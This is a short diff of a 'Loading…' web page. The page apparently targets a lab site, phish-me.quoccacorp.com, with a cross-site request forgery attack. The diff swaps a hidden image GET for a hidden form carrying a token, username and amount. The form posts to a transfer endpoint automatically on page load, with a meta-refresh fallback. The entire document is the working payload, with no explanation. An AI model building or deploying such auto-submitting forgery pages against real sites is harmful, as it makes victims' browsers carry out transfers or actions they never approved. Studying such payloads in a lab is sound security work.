@@ -5,10 +5,17 @@
   <title>Loading…</title>
 </head>
 <body>
-  <img
-    src="https://phish-me.quoccacorp.com/api/transfer?csrf_token=Mzc2NQ==&username=z5463756&amount=66"
-    style="display:none;"
-    alt=""
-  />
+  <form id="xfer" action="https://phish-me.quoccacorp.com/api/transfer" method="POST">
+    <input type="hidden" name="csrf_token" value="Mzc2NQ==">
+    <input type="hidden" name="username"    value="z5463756">
+    <input type="hidden" name="amount"      value="66">
+  </form>
+  <script>
+    document.getElementById('xfer').submit();
+  </script>
+  <noscript>
+    <meta http-equiv="refresh"
+          content="0;url=https://phish-me.quoccacorp.com/api/transfer?csrf_token=Mzc2NQ==&username=z5463756&amount=66">
+  </noscript>
 </body>
 </html>
